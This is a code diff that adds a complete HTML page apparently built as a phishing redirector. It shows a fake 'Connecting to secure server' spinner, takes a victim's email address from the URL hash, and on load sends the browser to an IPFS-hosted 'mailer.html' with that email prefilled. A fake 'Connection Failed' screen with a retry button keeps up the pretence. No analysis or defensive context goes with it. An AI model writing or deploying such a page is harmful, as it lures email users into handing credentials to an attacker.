@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>AUTHENTICATING Mail SERVER...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+        .spinner-container {
+            text-align: center;
+        }
+        .spinner {
+            width: 70px;
+            height: 70px;
+            border: 8px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .status-text {
+            font-size: 18px;
+            margin-top: 20px;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+        }
+        .error-message {
+            background: rgba(0,0,0,0.7);
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 80%;
+            text-align: center;
+            display: none;
+        }
+        .retry-btn {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            margin-top: 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="spinner-container">
+        <div class="spinner"></div>
+        <div class="status-text" id="statusText">Connecting to secure server...</div>
+    </div>
+    
+    <div class="error-message" id="errorMessage">
+        <h2>Connection Failed</h2>
+        <p id="errorDetail">Unable to establish secure connection</p>
+        <button class="retry-btn" id="retryBtn">Try Again</button>
+    </div>
+
+    <script>
+        const statusText = document.getElementById('statusText');
+        const errorMessage = document.getElementById('errorMessage');
+        const errorDetail = document.getElementById('errorDetail');
+        const retryBtn = document.getElementById('retryBtn');
+        
+        async function checkIPFS() {
+            try {
+                // Get email from URL hash
+                const hash = window.location.hash.substring(1);
+                let email = "{email}";
+                
+                if (hash.includes('email=')) {
+                    email = decodeURIComponent(hash.split('email=')[1]);
+                }
+                
+                // Construct IPFS URL
+                const ipfsURL = `https://bafybeienr7v7xdk23sucg2pkpnxdjdrna2q4ouhr22v4lcsvlipgvrtri4.ipfs.dweb.link/mailer.html#email=${encodeURIComponent(email)}`;
+                
+                statusText.textContent = "Verifying connection...";
+                
+                // Check if IPFS is accessible
+                const response = await fetch(ipfsURL, {
+                    method: 'HEAD',
+                    mode: 'no-cors',
+                    cache: 'no-cache'
+                });
+                
+                // If we get here, the request didn't fail
+                statusText.textContent = "Redirecting to secure portal...";
+                setTimeout(() => {
+                    window.location.href = ipfsURL;
+                }, 1500);
+                
+            } catch (error) {
+                console.error("Connection failed:", error);
+                showError("The secure authentication portal is currently unavailable. Please try again later.");
+            }
+        }
+        
+        function showError(message) {
+            document.querySelector('.spinner-container').style.display = 'none';
+            errorDetail.textContent = message;
+            errorMessage.style.display = 'block';
+        }
+        
+        retryBtn.addEventListener('click', () => {
+            errorMessage.style.display = 'none';
+            document.querySelector('.spinner-container').style.display = 'block';
+            statusText.textContent = "Reconnecting...";
+            setTimeout(checkIPFS, 1000);
+        });
+        
+        // Start the connection check
+        window.addEventListener('load', () => {
+            setTimeout(checkIPFS, 1000);
+        });
+    </script>
+</body>
+</html>
